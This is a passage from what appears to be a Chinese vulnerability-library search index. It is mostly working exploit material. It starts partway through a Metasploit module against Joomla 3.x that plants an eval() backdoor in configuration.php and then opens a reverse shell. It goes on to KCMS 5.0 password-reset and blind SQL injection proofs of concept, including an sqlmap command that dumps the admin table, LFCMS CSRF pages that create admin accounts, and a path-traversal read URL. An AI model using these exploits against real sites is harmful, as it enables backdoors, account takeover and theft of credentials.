3.4.6', {}]],\n      'DisclosureDate' =&gt; 'Oct 02  2019',\n      'DefaultTarget'  =&gt; 0)\n    )\n\n    register_advanced_options(\n      [\n        OptBool.new('FORCE', [true, 'Force run even if check reports the service is safe.', false]),\n      ])\n  end\n\n  def get_random_string(length=50)\n    source=(\"a\"..\"z\").to_a + (\"A\"..\"Z\").to_a + (0..9).to_a \n    key=\"\"\n    length.times{ key += source[rand(source.size)].to_s }\n    return key\n  end\n\n  def get_session_token\n    # Get session token from cookies\n    vprint_status('Getting Session Token')\n    res = send_request_cgi({\n        'method' =&gt; 'GET',\n        'uri'    =&gt; normalize_uri(target_uri.path) \n    })\n\n    cook = res.headers['Set-Cookie'].split(';')[0]\n    vprint_status('Session cookie: ' + cook)\n    return cook\n  end\n\n  def get_csrf_token(sess_cookie)\n      vprint_status('Getting CSRF Token')\n\n      res = send_request_cgi({\n        'method' =&gt; 'GET',\n        'uri'    =&gt; normalize_uri(target_uri.path,'/index.php/component/users'),\n        'headers' =&gt; {\n            'Cookie' =&gt; sess_cookie,\n        }\n      })\n\n      html = res.get_html_document\n      input_field = html.at('//form').xpath('//input')[-1]\n      token = input_field.to_s.split(' ')[2]\n      token = token.gsub('name=\"','').gsub('\"','')\n      if token then\n          vprint_status('CSRF Token: ' + token)\n          return token\n      end\n      print_error('Cannot get the CSRF Token ..')\n\n  end\n\n  def get_payload(function, payload)\n      # @function: The PHP Function\n      # @payload: The payload for the call\n      template = 's:11:\"maonnalezzo\":O:21:\"JDatabaseDriverMysqli\":3:{s:4:\"\\\\0\\\\0\\\\0a\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\\\0\\\\0\\\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:5:\"cache\";b:1;s:19:\"cache_name_function\";s:FUNC_LEN:\"FUNC_NAME\";s:10:\"javascript\";i:9999;s:8:\"feed_url\";s:LENGTH:\"PAYLOAD\";}i:1;s:4:\"init\";}}s:13:\"\\\\0\\\\0\\\\0connection\";i:1;}'\n      # The http:// part is necessary in order to validate a condition in SimplePie::init and trigger the call_user_func with arbitrary values\n      payload = 'http://l4m3rz.l337/;' + payload\n      final = template.gsub('PAYLOAD',payload).gsub('LENGTH', payload.length.to_s).gsub('FUNC_NAME', function).gsub('FUNC_LEN', function.length.to_s)\n      return final\n  end\n\n\n  def get_payload_backdoor(param_name) \n    # return the backdoor payload\n    # or better, the payload that will inject and eval function in configuration.php (in the root)\n    # As said in other part of the code. we cannot create new .php file because we cannot use \n    # the ? character because of the check on URI schema\n    function = 'assert'\n        template = 's:11:\"maonnalezzo\":O:21:\"JDatabaseDriverMysqli\":3:{s:4:\"\\\\0\\\\0\\\\0a\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\\\0\\\\0\\\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:5:\"cache\";b:1;s:19:\"cache_name_function\";s:FUNC_LEN:\"FUNC_NAME\";s:10:\"javascript\";i:9999;s:8:\"feed_url\";s:LENGTH:\"PAYLOAD\";}i:1;s:4:\"init\";}}s:13:\"\\\\0\\\\0\\\\0connection\";i:1;}'                                                             \n        # This payload will append an eval() at the end of the configuration file                                                                            \n        payload =  \"file_put_contents('configuration.php','if(isset($_POST[\\\\'\"+param_name+\"\\\\'])) eval($_POST[\\\\'\"+param_name+\"\\\\']);', FILE_APPEND) || $a=\\'http://wtf\\';\"\n    template['PAYLOAD']  = payload \n    template['LENGTH']   = payload.length.to_s\n    template['FUNC_NAME'] = function \n    template['FUNC_LEN'] = function.length.to_s\n        return template \n\n  end\n\n\n  def check_by_exploiting\n        # Check that is vulnerable by exploiting it and try to inject a printr('something')\n        # Get the Session anb CidSRF Tokens\n        sess_token = get_session_token()\n        csrf_token = get_csrf_token(sess_token)\n\n        print_status('Testing with a POC object payload')\n\n        username_payload = '\\\\0\\\\0\\\\0' * 9\n        password_payload = 'AAA\";'                      # close the prev object\n        password_payload += get_payload('print_r','IAMSODAMNVULNERABLE')    # actual payload \n        password_payload += 's:6:\"return\":s:102:'               # close cleanly the object\n        res = send_request_cgi({\n            'uri'      =&gt; normalize_uri(target_uri.path,'/index.php/component/users'),\n            'method'   =&gt; 'POST',\n            'headers'  =&gt; \n                {\n                'Cookie' =&gt; sess_token,\n            },\n            'vars_post' =&gt; {\n                'username' =&gt; username_payload,\n                'password' =&gt; password_payload,\n                'option'   =&gt; 'com_users',\n                'task'     =&gt; 'user.login',\n                csrf_token =&gt; '1',\n            }\n        }) \n        # Redirect in order to retrieve the output\n        if res.redirection then\n        res_redirect = send_request_cgi({\n            'method' =&gt; 'GET',\n            'uri'    =&gt; res.redirection.to_s,\n            'headers' =&gt;{\n                'Cookie' =&gt; sess_token\n            }\n        })\n\n        if 'IAMSODAMNVULNERABLE'.in? res.to_s or 'IAMSODAMNVULNERABLE'.in? res_redirect.to_s then\n            return true\n        else\n            return false\n        end\n\n        end\n    end\n\n  def check\n    # Check if the target is UP and get the current version running by info leak    \n    res = send_request_cgi({'uri' =&gt; normalize_uri(target_uri.path, '/administrator/manifests/files/joomla.xml')})\n    unless res\n      print_error(\"Connection timed out\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    # Parse XML to get the version \n    if res.code == 200 then\n        xml = res.get_xml_document\n        version = xml.at('version').text\n        print_status('Identified version ' + version)\n        if version &lt;= '3.4.6' and version &gt;= '3.0.0' then\n            if check_by_exploiting()\n            return Exploit::CheckCode::Vulnerable\n            else\n            if check_by_exploiting() then\n            # Try the POC 2 times. \n                return Exploit::CheckCode::Vulnerable\n            else\n                return Exploit::CheckCode::Safe\n            end\n            end\n        else\n            return Exploit::CheckCode::Safe\n        end\n    else\n        print_error('Cannot retrieve XML file for the Joomla Version. Try the POC in order to confirm if it\\'s vulnerable')\n        if check_by_exploiting() then\n            return Exploit::CheckCode::Vulnerable\n        else\n            if check_by_exploiting() then\n            return Exploit::CheckCode::Vulnerable\n            else\n                return Exploit::CheckCode::Safe\n            end\n        end\n    end\n  end\n\n\n\n\n  def exploit\n    if check == Exploit::CheckCode::Safe &amp;&amp; !datastore['FORCE']\n      print_error('Target is not vulnerable')\n      return\n    end\n\n\n    pwned = false\n    cmd_param_name = get_random_string(50) \n\n    sess_token = get_session_token()\n    csrf_token = get_csrf_token(sess_token)\n\n    # In order to avoid problems with disabled functions\n    # We are gonna append an eval() function at the end of the configuration.php file\n    # This will not cause any problem to Joomla and is a good way to execute then PHP directly\n    # cuz assert is toot annoying and with conditions that we have we cannot inject some characters\n    # So we will use 'assert' with file_put_contents to append the string. then create a reverse shell with this backdoor\n    # Oh i forgot, We cannot create a new file because we cannot use the '?' character in order to be interpreted by the web server.\n\n    # TODO: Add the PHP payload object to inject the backdoor inside the configuration.php file\n    #       Use the implanted backdoor to receive a nice little reverse shell with a PHP payload\n\n\n    # Implant the backdoor\n    vprint_status('Cooking the exploit ..')\n    username_payload = '\\\\0\\\\0\\\\0' * 9\n    password_payload = 'AAA\";'                      # close the prev object\n    password_payload += get_payload_backdoor(cmd_param_name)        # actual payload \n    password_payload += 's:6:\"return\":s:102:'               # close cleanly the object\n\n    print_status('Sending exploit ..')\n\n\n    res = send_request_cgi({\n        'uri'      =&gt; normalize_uri(target_uri.path,'/index.php/component/users'),\n        'method'   =&gt; 'POST',\n        'headers'  =&gt; {\n            'Cookie' =&gt; sess_token\n        },\n        'vars_post' =&gt; {\n            'username' =&gt; username_payload,\n            'password' =&gt; password_payload,\n            'option'   =&gt; 'com_users',\n            'task'     =&gt; 'user.login',\n            csrf_token =&gt; '1'\n        }\n    }) \n\n    print_status('Triggering the exploit ..')    \n    if res.redirection then\n    res_redirect = send_request_cgi({\n        'method' =&gt; 'GET',\n        'uri'    =&gt; res.redirection.to_s,\n        'headers' =&gt;{\n            'Cookie' =&gt; sess_token\n        }\n    })\n    end\n\n    # Ping the backdoor see if everything is ok :/\n    res = send_request_cgi({\n        'method'     =&gt; 'POST',\n        'uri'        =&gt; normalize_uri(target_uri.path,'configuration.php'),\n        'vars_post'  =&gt; {\n            cmd_param_name  =&gt; 'echo \\'PWNED\\';' \n        }\n    })\n    if res.to_s.include? 'PWNED' then\n    print_status('Target P0WN3D! eval your code at /configuration.php with ' + cmd_param_name + ' in a POST')\n    pwned = true\n    end\n\n\n\n    if pwned then\n        print_status('Now it\\'s time to reverse shell')\n        res = send_request_cgi({\n        'method'     =&gt; 'POST',\n        'uri'        =&gt; normalize_uri(target_uri.path,'configuration.php'),\n        'vars_post'  =&gt; {\n            cmd_param_name  =&gt; payload.encoded \n        }\n    })\n    end\n\n  end\nend\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/KCMS/KCMS5.0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/KCMS5.0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/","title":"KCMS5.0\u4efb\u610f\u7528\u6237\u5bc6\u7801\u91cd\u7f6e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/KCMS/KCMS5.0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/KCMS5.0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5\uff1a","text":"<p>\u6f0f\u6d1e\u51fa\u73b0\u5728<code>/ucenter/repass.php</code>\u7b2c1-44\u884c:</p> <pre><code>&lt;?php \ninclude('../system/inc.php');\nif(isset($_SESSION['user_name'])){\nheader('location:index.php');\n};\n\nif(isset($_POST['submit'])){\n$username = stripslashes(trim($_POST['name']));\n$email = trim($_POST['email']);\n// \u68c0\u6d4b\u7528\u6237\u540d\u662f\u5426\u5b58\u5728\n$query = mysql_query(\"select u_id from mkcms_user where u_name='$username' and u_email='$email'\");\nif(!! $row = mysql_fetch_array($query)){\n$_data['u_password'] = md5(123456);\n$sql = 'update mkcms_user set '.arrtoupdate($_data).' where u_name=\"'.$username.'\"';\nif (mysql_query($sql)) {\n\n$token =$row['u_question'];\ninclude(\"emailconfig.php\");\n//\u521b\u5efa$smtp\u5bf9\u8c61 \u8fd9\u91cc\u9762\u7684\u4e00\u4e2atrue\u662f\u8868\u793a\u4f7f\u7528\u8eab\u4efd\u9a8c\u8bc1,\u5426\u5219\u4e0d\u4f7f\u7528\u8eab\u4efd\u9a8c\u8bc1.\n$smtp = new Smtp($MailServer, $MailPort, $smtpuser, $smtppass, true); \n$smtp-&gt;debug = false; \n$mailType = \"HTML\"; //\u4fe1\u4ef6\u7c7b\u578b\uff0c\u6587\u672c:text\uff1b\u7f51\u9875\uff1aHTML\n$email = $email;  //\u6536\u4ef6\u4eba\u90ae\u7bb1\n$emailTitle = \"\".$mkcms_name.\"\u7528\u6237\u627e\u56de\u5bc6\u7801\"; //\u90ae\u4ef6\u4e3b\u9898\n$emailBody = \"\u4eb2\u7231\u7684\".$username.\"\uff1a&lt;br/&gt;\u611f\u8c22\u60a8\u5728\u6211\u7ad9\u6ce8\u518c\u5e10\u53f7\u3002&lt;br/&gt;\u60a8\u7684\u521d\u59cb\u5bc6\u7801\u4e3a123456&lt;br/&gt;\u5982\u679c\u6b64\u6b21\u627e\u56de\u5bc6\u7801\u8bf7\u6c42\u975e\u4f60\u672c\u4eba\u6240\u53d1\uff0c\u8bf7\u5ffd\u7565\u672c\u90ae\u4ef6\u3002&lt;br/&gt;&lt;p style='text-align:right'&gt;-------- \".$mkcms_name.\" \u656c\u4e0a&lt;/p&gt;\";\n\n// sendmail\u65b9\u6cd5\n// \u53c2\u65701\u662f\u6536\u4ef6\u4eba\u90ae\u7bb1\n// \u53c2\u65702\u662f\u53d1\u4ef6\u4eba\u90ae\u7bb1\n// \u53c2\u65703\u662f\u4e3b\u9898\uff08\u6807\u9898\uff09\n// \u53c2\u65704\u662f\u90ae\u4ef6\u4e3b\u9898\uff08\u6807\u9898\uff09\n// \u53c2\u65704\u662f\u90ae\u4ef6\u5185\u5bb9  \u53c2\u6570\u662f\u5185\u5bb9\u7c7b\u578b\u6587\u672c:text \u7f51\u9875:HTML\n$rs = $smtp-&gt;sendmail($email, $smtpMail, $emailTitle, $emailBody, $mailType);\nif($rs==true){\necho '&lt;script&gt;alert(\"\u8bf7\u767b\u5f55\u5230\u60a8\u7684\u90ae\u7bb1\u67e5\u770b\u60a8\u7684\u5bc6\u7801\uff01\");window.history.go(-1);&lt;/script&gt;';\n}else{\necho \"\u627e\u56de\u5bc6\u7801\u5931\u8d25\";\n}\n\n}\n}\n}\n\n?&gt;\n</code></pre> <p>\u672c\u8d28\u4e0a\u6765\u8bf4\u6b64\u5904\u662f\u4e00\u4e2a\u903b\u8f91\u95ee\u9898\uff0c\u7a0b\u5e8f\u672a\u901a\u8fc7\u90ae\u7bb1\u7b49\u9a8c\u8bc1\u662f\u5426\u4e3a\u7528\u6237\u672c\u8eab\u5c31\u76f4\u63a5\u5148\u5728\u7b2c13-14\u884c\u628a\u7528\u6237\u5bc6\u7801\u91cd\u7f6e\u4e3a123456\u4e86\uff0c\u6839\u672c\u6ca1\u7ba1\u90ae\u4ef6\u53d1\u9001\u6210\u529f\u6ca1\u6709\u3002</p> <p></p> <p>\u6b64\u5904\u8fc7\u6ee4\u4e86\u5355\u5f15\u53f7\uff0c\u6240\u4ee5\u65e0\u6cd5\u901a\u8fc7\u7136\u540e\u90ae\u7bb1\u8d26\u53f7\u8fdb\u884c\u91cd\u7f6e</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/KCMS/KCMS5.0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/KCMS5.0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/#_2","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://xz.aliyun.com/t/4189</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/KCMS/KCMS5.0%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/KCMS5.0%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/","title":"KCMS5.0\u524d\u53f0SQL\u6ce8\u5165","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/KCMS/KCMS5.0%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/KCMS5.0%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5\uff1a","text":"<p>\u6f0f\u6d1e\u51fa\u73b0\u5728/ucenter/reg.php\u7b2c7-19\u884c:</p> <pre><code>if(isset($_POST['submit'])){\n$username = stripslashes(trim($_POST['name']));\n// \u68c0\u6d4b\u7528\u6237\u540d\u662f\u5426\u5b58\u5728\n$query = mysql_query(\"select u_id from mkcms_user where u_name='$username'\");\nif(mysql_fetch_array($query)){\necho '&lt;script&gt;alert(\"\u7528\u6237\u540d\u5df2\u5b58\u5728\uff0c\u8bf7\u6362\u4e2a\u5176\u4ed6\u7684\u7528\u6237\u540d\");window.history.go(-1);&lt;/script&gt;';\nexit;\n}\n$result = mysql_query('select * from mkcms_user where u_email = \"'.$_POST['email'].'\"');\nif(mysql_fetch_array($result)){\necho '&lt;script&gt;alert(\"\u90ae\u7bb1\u5df2\u5b58\u5728\uff0c\u8bf7\u6362\u4e2a\u5176\u4ed6\u7684\u90ae\u7bb1\");window.history.go(-1);&lt;/script&gt;';\nexit;\n}\n</code></pre> <p>\u6ce8\u518c\u7528\u6237\u540d\u65f6$username\u53c2\u6570\u4f20\u5230\u540e\u53f0\u540e\u7ecf\u8fc7stripslashes()\u51fd\u6570\u5904\u7406\uff0c\u800cstripslashes()\u51fd\u6570\u7684\u4f5c\u7528\u662f\u5220\u9664addslashes() \u51fd\u6570\u6dfb\u52a0\u7684\u53cd\u659c\u6760\u3002\u8fd9\u91cc\u5c31\u5f88\u90c1\u95f7\u4e86\uff0c\u8fc7\u6ee4\u53cd\u659c\u6760\u5e72\u561b\uff1f</p> <p>\u5f53\u524d\u9875\u9762\u65e0\u8f93\u51fa\u70b9\uff0c\u53ea\u662f\u8fd4\u56de\u4e00\u4e2a\u6ce8\u518c/\u672a\u6ce8\u518c\uff08\u901a\u8fc7if\u5224\u65adtrue\u6216\u8005false)\uff0c\u53ef\u4ee5\u4f7f\u7528\u5e03\u5c14\u76f2\u6ce8\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898</p> <p>POC\uff1a</p> <pre><code>POST /ucenter/reg.php HTTP/1.1\nHost: 127.0.0.1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en\nAccept-Encoding: gzip, deflate\nReferer: http://127.0.0.1/ucenter/reg.php\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 52\nConnection: close\nCookie: PHPSESSID=cb8e6ccde6cf9050972fa9461d606be3\nUpgrade-Insecure-Requests: 1\n\nname=test' AND 1=1 AND 'inject'='inject&amp;email=sss%40qq.com&amp;password=ssssss&amp;submit=\n</code></pre> <p></p> <p>\u5c06POC\u4e2d\u7684\u6570\u636e\u5305\u4fdd\u5b58\u4e0b\u6765\u4e22\u7ed9sqlmap\u8dd1\u5373\u53ef\u3002</p> <p>\u83b7\u53d6\u7ba1\u7406\u5458\u8d26\u53f7\uff1a</p> <pre><code>sqlmap -r inject.txt -D mkcms -T mkcms_manager --dump\n</code></pre> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/KCMS/KCMS5.0%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/KCMS5.0%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/#_2","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://xz.aliyun.com/t/4189</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%203.7.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E6%B7%BB%E5%8A%A0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E6%88%96%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/","title":"LFCMS 3.7.0\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u6dfb\u52a0\u4efb\u610f\u7528\u6237\u8d26\u6237\u6216\u4efb\u610f\u7ba1\u7406\u5458\u8d26\u6237","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%203.7.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E6%B7%BB%E5%8A%A0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E6%88%96%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 LFCMS 3.7.0\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u6dfb\u52a0\u4efb\u610f\u7528\u6237\u8d26\u6237\u6216\u4efb\u610f\u7ba1\u7406\u5458\u8d26\u6237 2018-06-20 Bay0net http://www.lfdycms.com/ http://www.lfdycms.com/ 3.7.0 CVE-2018-12602"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%203.7.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E6%B7%BB%E5%8A%A0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E6%88%96%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#_2","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u6784\u9020 CSRF \u8bf7\u6c42\uff0c\u6765\u65b0\u589e\u4efb\u610f\u7528\u6237\u3002   </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%203.7.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E6%B7%BB%E5%8A%A0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E6%88%96%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#poc","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a","text":"<p>\u901a\u8fc7CSRF\u589e\u52a0\u4efb\u610f\u7528\u6237 \u7684exp\u4ee3\u7801\u5982\u4e0b\uff1a  </p> <pre><code>&lt;html&gt;\n  &lt;body&gt;\n  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;\n    &lt;form action=\"http://10.211.55.17/lfdycms3.7.0/admin.php?s=/Users/add.html\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"username\" value=\"test222\" /&gt;\n      &lt;input type=\"hidden\" name=\"email\" value=\"test2@qq.com\" /&gt;\n      &lt;input type=\"hidden\" name=\"password\" value=\"test222\" /&gt;\n      &lt;input type=\"hidden\" name=\"repassword\" value=\"test222\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u901a\u8fc7CSRF\u589e\u52a0\u7ba1\u7406\u5458\u7528\u6237 \u7684exp\u4ee3\u7801\u5982\u4e0b\uff1a  </p> <pre><code>&lt;html&gt;\n  &lt;body&gt;\n  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;\n    &lt;form action=\"http://10.211.55.17/lfdycms3.7.0/admin.php?s=/Member/add.html\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"username\" value=\"admin2\" /&gt;\n      &lt;input type=\"hidden\" name=\"password\" value=\"admin2\" /&gt;\n      &lt;input type=\"hidden\" name=\"repassword\" value=\"admin2\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","title":"LFCMS\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#_1","title":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#_2","title":"\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#_3","title":"\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b","text":"<p>\u6f0f\u6d1e\u8d77\u59cb\u70b9\u4f4d\u4e8e/Application/Admin/Controller/TemplateController.class.php\u4e2d\u7684edit\u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u7528\u4f5c\u540e\u53f0\u6a21\u677f\u7f16\u8f91\uff0c\u5173\u952e\u4ee3\u7801\u5982\u4e0b </p> <p>\u6211\u4eec\u4f20\u5165\u7684\u8def\u5f84\u9700\u8981\u5c06/\u66ff\u6362\u4e3a*\u63a5\u7740\u8c03\u7528\u4e86read\u65b9\u6cd5\uff0c\u8ddf\u8fdb\u8be5\u65b9\u6cd5</p> <pre><code>public function read($filename,$type=''){\n  return $this-&gt;get($filename,'content',$type);\n}\n</code></pre> <p>\u7ee7\u7eed\u8ddf\u8fdbget\u65b9\u6cd5</p> <pre><code>public function get($filename,$name,$type='') {\nif(!isset($this-&gt;contents[$filename])) {\nif(!is_file($filename)) return false;\n$this-&gt;contents[$filename]=file_get_contents($filename);\n}\n$content=$this-&gt;contents[$filename];\n$info   =   array(\n'mtime' =&gt;  filemtime($filename),\n'content'   =&gt;  $content\n);\nreturn $info[$name];\n}\n}\n</code></pre> <p>\u8be5\u65b9\u6cd5\u4e2d\u8fd4\u56de\u4e86\u8981\u8bfb\u53d6\u7684\u6587\u4ef6\u5185\u5bb9\uff0c\u53ef\u4ee5\u770b\u5230\u5728\u6574\u4e2a\u6d41\u7a0b\u4e2d\u6ca1\u6709\u5bf9\u4f20\u5165\u53c2\u6570path\u7684\u8fc7\u6ee4\uff0c\u5bfc\u81f4\u6211\u4eec\u53ef\u4ee5\u8de8\u76ee\u5f55\u8bfb\u6587\u4ef6\uff0c\u4e0b\u9762\u6765\u9a8c\u8bc1\u4e00\u4e0b\uff0c\u5c1d\u8bd5\u8bfb\u53d6\u4e00\u4e0b\u8ddf\u76ee\u5f55index.php\u6587\u4ef6\uff0c\u6d4b\u8bd5\u94fe\u63a5\u5982\u4e0b</p> <pre><code>http://lfcms.com/admin.php?s=/Template/edit/path/*..*index.php\n</code></pre> <p> \u6210\u529f\u7684\u8bfb\u5230\u4e86CMS\u7684\u5165\u53e3\u6587\u4ef6</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#_4","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://xz.aliyun.com/t/7844#toc-4</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/","title":"LFCMS\u524d\u53f0sql\u6ce8\u5165\uff08\u4e00\uff09","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/#_1","title":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/#_2","title":"\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/#_3","title":"\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b","text":"<p>\u6f0f\u6d1e\u8d77\u59cb\u70b9\u4f4d\u4e8e/Application/Home/Controller/NewsController.class.php\u4e2d\u7684index\u65b9\u6cd5\uff0c\u4ee3\u7801\u5982\u4e0b  \u5728\u4ee3\u7801\u7b2c\u516d\u884c\u8c03\u7528\u4e86News\u6a21\u578b\u4e2d\u7684detail\u65b9\u6cd5\uff0c\u8ddf\u8fdb\u8be5\u65b9\u6cd5  